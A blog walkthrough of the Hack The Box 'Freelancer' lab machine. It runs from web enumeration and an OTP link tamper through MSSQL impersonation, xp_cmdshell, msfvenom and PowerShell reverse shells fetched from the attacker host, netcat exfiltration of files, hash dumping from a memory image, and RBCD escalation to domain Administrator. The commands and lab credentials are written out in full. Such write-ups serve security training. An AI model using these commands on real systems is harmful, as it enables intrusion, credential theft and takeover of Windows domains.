---
layout: post
title: "Freelancer HTB writeup"
subtitle: "Walkethrough for the Freelancer HTB machine."
date: 2024-11-06 23:45:13
background: '/img/posts/04.jpg'

---

## Report

begin with the usual `nmap` scan.

```bash
nmap $ip -sV
```

We get a usual active directory setup plus a port `80` HTTP server.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106114413.png" alt="1" style="width:700px; height:auto;">
<br/>


- 53: `DNS` as a domain is active.
- 80: `HTTP` with an `nginx` server up. 
- 88: `Kerberos` common in active directory but some attacks can be tested like `asreproasting` or `kerberoasting` the users.
- 135: `RPC`
- 139/445: `SMB` protocol for file sharing. 
- 389: `ldap` with a domain controller `freelancer.htb`  


We can begin by enumerating `SMB` with `smbmap` to see if we can have an anonymous session.  

```bash
smbmap -u '' -p '' -H $ip
```

It was unsuccessful.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106124835.png" alt="1" style="width:700px; height:auto;">
<br/>

We can interact with the `HTTP` server by opening the browser but first add the domain `freelancer.htb` to the `/etc/hosts` file.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106125016.png" alt="1" style="width:700px; height:auto;">
<br/>

We are welcomed with this `index` page.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106125117.png" alt="1" style="width:700px; height:auto;">
<br/>

We can register as an `Employer` or a `freelancer`.  

## <mark>Freelancer registration:</mark>
 - xtromera
 - xtromera@xtromera.com
 - xtromera
 - freelancer
 - test
 - test
 - test
 - test
 - test
 - 1
 - test
 - test@1234
 - test@1234  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106125551.png" alt="1" style="width:700px; height:auto;">
<br/>

## <mark>Employer registration:</mark>
	
- xtromera1
- xtromera1@xtromera.com
- xtromera
- employer
- test
- test
- test
- test
- test
- test@1234
- test@1234

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106125541.png" alt="1" style="width:700px; height:auto;">
<br/>

When we login as the new `employer` user created we get this error.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106125709.png" alt="1" style="width:700px; height:auto;">
<br/>

But for the `freelancer` we are logged in without any problem.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106125759.png" alt="1" style="width:700px; height:auto;">
<br/>

We can run `gobuster` on the background to see if we can find any interesting directory.   

```bash
gobuster dir -u="http://freelancer.htb" -w=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt,zip,sh
```

At the address `http://freelancer.htb/blog/details/?article_id=1`
we can see that it uses the `article_id` parameter to show some articles on the page and by changing the `ID`, we change the article being shown.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106130128.png" alt="1" style="width:700px; height:auto;">
<br/>

We can try some `SQL injection` or `LFI` payloads.  
Will begin with `SQL injection`. 

- <mark>SQL Injection:</mark>

Firing up `burpsuite` and intercept the page.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106130523.png" alt="1" style="width:700px; height:auto;">
<br/>

copy the request and save it into a file.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106132402.png" alt="1" style="width:700px; height:auto;">
<br/>

Fire `sqlmap`. 

```bash
sqlmap -r req --level 3 --risk 3 --batch
```

Checking the comment section, we can find some account names.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106132740.png" alt="1" style="width:700px; height:auto;">
<br/>

By clicking on one of the accounts we are redirected to  `http://freelancer.htb/accounts/profile/visit/5/`.  

Changing the account number, we find something interesting.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106133050.png" alt="1" style="width:700px; height:auto;">
<br/>

The `admin` page with profile number `2`.   

`SQL injection` did not lead to anything.  

Lets play with the employer account. When we try to login, we get the account activation error. Trying the `forgot password` button.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106134534.png" alt="1" style="width:700px; height:auto;">
<br/>

We can reset the password to be `test@12345`.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106134850.png" alt="1" style="width:700px; height:auto;">
<br/>

We can now `login`.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106134947.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see something interesting, a `OTP-QR-CODE`.   

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106135120.png" alt="1" style="width:700px; height:auto;">
<br/>

Scanning the `QR code`, we can see it does refer to  `http://freelancer.htb/accounts/login/otp/MTAwMTE=/0a0ad34bbed20881b841d94973d7a6d2/`.   

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106135409.png" alt="1" style="width:700px; height:auto;">
<br/>

Decode the `base64` part.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106135807.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a number  it may be a `binary` number equal to `19`.   

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106140452.png" alt="1" style="width:700px; height:auto;">
<br/>

Using the `QR code` link it send us to our profile. Trying to change the binary number to `2` in binary as we discovered the `ID` of the `admin` to be `2` and try again.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106141048.png" alt="1" style="width:700px; height:auto;">
<br/>

We are logged in as `admin` (The correct `Base64` code was `0002` as it was `decimal` not `binary`).   

Checking the `gobuster`, we found a directory called `admin`.   

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106141250.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the `admin` directory.   

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106141343.png" alt="1" style="width:700px; height:auto;">
<br/>

We found a `SQL` terminal.   

We grab the `server` version.   

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106142328.png" alt="1" style="width:700px; height:auto;">
<br/>

The following `sql` query gives out the name of the `databases`.  

```sql
select schema_name from information_schema.schemata;
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106175854.png" alt="1" style="width:700px; height:auto;">
<br/>

To get the `tables` inside each `database`.   

```sql
SELECT TABLE_NAME 
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA = 'db_name';
```
- <mark>dbo:</mark>  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106201438.png" alt="1" style="width:700px; height:auto;">
<br/>

- <mark>guest:</mark>  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106201454.png" alt="1" style="width:700px; height:auto;">
<br/>

The rest where all empty.  

To select everything from the  `freelancer_customuser` table.  

```sql
select * from dbo.freelancer_customuser;
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106201844.png" alt="1" style="width:700px; height:auto;">
<br/>

The hashes are in `pbkdf2_sha256` format which are very secure and will take too long to crack.    
Cracking the hashes from the database is not the intended way as it suppose. Lets try another way.  

To check the permissions for my current user `Freelancer_webapp_user`. 

```sql
SELECT 
    sp.name AS principal_name,
    sp.type_desc AS principal_type,
    sp.default_database_name,
    sp.create_date,
    sp.modify_date,
    sp.is_disabled,
    p.permission_name,
    p.state_desc AS permission_state
FROM 
    sys.server_permissions AS p
JOIN 
    sys.server_principals AS sp ON p.grantee_principal_id = sp.principal_id
WHERE 
    sp.name = 'Freelancer_webapp_user';

```

We can see something interesting.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106202724.png" alt="1" style="width:700px; height:auto;">
<br/>

the `IMPERSONATE` permission is active for the user `Freelancer_webapp_user`. This means that `Freelancer_webapp_user` has been explicitly granted the `IMPERSONATE` permission, which allows the user to assume the identity of other SQL Server principals (such as other users or logins) within the SQL Server instance.  
We can impersonate the database admin. 

```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER AS CurrentLogin;
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106203125.png" alt="1" style="width:700px; height:auto;">
<br/>

We are now the `system admin`. 

```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER AS CurrentLogin;
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'curl http://10.10.16.5:8000';
```

We can see that the `command` was executed successfully.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106204707.png" alt="1" style="width:700px; height:auto;">
<br/>

We can make a `reverse shell` using `powershell` but it did not work so we can make a reverse shell using `msfvenom`.   

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106205408.png" alt="1" style="width:700px; height:auto;">
<br/>

Now upload it on the server.  

```sql
EXEC xp_cmdshell 'curl http://10.10.16.5:8000/shell-x64.exe -o "C:\users\public\shell.exe"';
```

No answer still so we may use `nc.exe` to execute the reverse shell.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106215230.png" alt="1" style="width:700px; height:auto;">
<br/>

We get an answer.  

Payload:  

```sql
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell "powershell -ep bypass iex(iwr http://10.10.16.5:8000/reverse.ps1 -usebasicp)";
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106215311.png" alt="1" style="width:700px; height:auto;">
<br/>

Found in the folder `C:\users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU` a file called `sql-Configuration.INI`.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106215517.png" alt="1" style="width:700px; height:auto;">
<br/>

`2` passwords  `IL0v3ErenY3ager` and  `t3mp0r@ryS@PWD`.  

the valid combination where `mikasaAckerman:IL0v3ErenY3ager`.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106215702.png" alt="1" style="width:700px; height:auto;">
<br/>

Trying `evil-winrm` to get a session but was unsuccessful. So running `runasCs.exe` for lateral movement.   

```powershell
./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.16.5:5555
```

We get a connection.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106220136.png" alt="1" style="width:700px; height:auto;">
<br/>

In the `mikasa` folder, we find `2` files other than the `flag`.   

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106220702.png" alt="1" style="width:700px; height:auto;">
<br/>

Downloaded them `netcat`  and upload the files 

```powershell
Get-Content mail.txt | C:\users\public\nc64.exe -nv 10.10.16.5 6666
```

The file was uploaded successfully .

- `mail.txt`:

```text
Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
```

This note refer to some credentials for `liza` we need to extract from the `memory.7z` file we just received.   

use `7z` to decompress the file.   

```bash
7z x MEMORY.7z
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106224548.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a `MS Windows 64bit crash dump` file.   

We can use `memprocfs` to be able to extract the dump.   


```bash
/opt/build/MemProcFS/files/memprocfs -device MEMORY.DMP -mount /mnt
```

The terminal hung up.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106232259.png" alt="1" style="width:700px; height:auto;">
<br/>

On another `terminal`, we can see the output.   

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106232320.png" alt="1" style="width:700px; height:auto;">
<br/>

In the `registry/hive_files` we can see the `SAM`, `Security` and `SYSTEM` files.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106232418.png" alt="1" style="width:700px; height:auto;">
<br/>

We can use `secretsdump.py` to get the hashes.   

```bash
secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive local
```

We can see an output.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106232558.png" alt="1" style="width:700px; height:auto;">
<br/>

A clear text password can be extracted `PWN3D#l0rr@Armessa199`.  

We can try it on the users we got.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106232703.png" alt="1" style="width:700px; height:auto;">
<br/>

A valid combination can be found `lorra199:PWN3D#l0rr@Armessa199`.  

This time we can use `evil-wirnm`.   

```bash
evil-winrm -i $ip -u "lorra199" -p 'PWN3D#l0rr@Armessa199'
```
<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106232847.png" alt="1" style="width:700px; height:auto;">
<br/>

We can use `bloodhound` to look for opportunities.  

 
```bash
bloodhound-python -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -dc freelancer.htb -d freelancer.htb -ns $ip --use-ldap --zip -c ALL
```

We get an error.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106233945.png" alt="1" style="width:700px; height:auto;">
<br/>

`Clock skew too great` was a common error we solved in a previous machine using this command.   

```bash
faketime "$(ntpdate -q $ip | cut -d ' ' -f 1,2)" bloodhound-python -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -dc freelancer.htb -d freelancer.htb -ns $ip  --zip -c ALL
```

The command was successful.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106234051.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see that `LORRA` is a member of `AD RECYCLE BIN` group.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106234348.png" alt="1" style="width:700px; height:auto;">
<br/>

The group has `GenericWrite` on the domain.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106234624.png" alt="1" style="width:700px; height:auto;">
<br/>

We can `exploit` this permission now.   

We add a computer using `addcomputer.py`.  

```bash
faketime "$(ntpdate -q $ip | cut -d ' ' -f 1,2)" addcomputer.py 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199' -dc-ip 10.10.11.5
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106235419.png" alt="1" style="width:700px; height:auto;">
<br/>

`Delegate` the account.   

```bash
rbcd.py -delegate-from 'DESKTOP-JKLYP2QJ$' -delegate-to 'dc$' -dc-ip 10.10.11.5 -action write 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241106235705.png" alt="1" style="width:700px; height:auto;">
<br/>

Now requet a `ticket` to impersonate the `Administrator`.   

```bash
 faketime "$(ntpdate -q $ip | cut -d ' ' -f 1,2)" getST.py -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/DESKTOP-JKLYP2QJ$:IiE91RrRr
SlYkifXGLayBQV9KguhQRM8
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241107000122.png" alt="1" style="width:700px; height:auto;">
<br/>

We can now Login as `Administrator`.   

```bash
KRB5CCNAME='Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache'  faketime "$(ntpdate -q $ip | cut -d ' ' -f 1,2)" impacket-wmiexec -no-pass -k freelancer.htb/administr
ator@dc.freelancer.htb
```

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241107000918.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was `pawned` successfully.  

<br/> 
<img src="/img/freelancer_screenshots/Pasted image 20241107001127.png" alt="1" style="width:700px; height:auto;">
<br/>



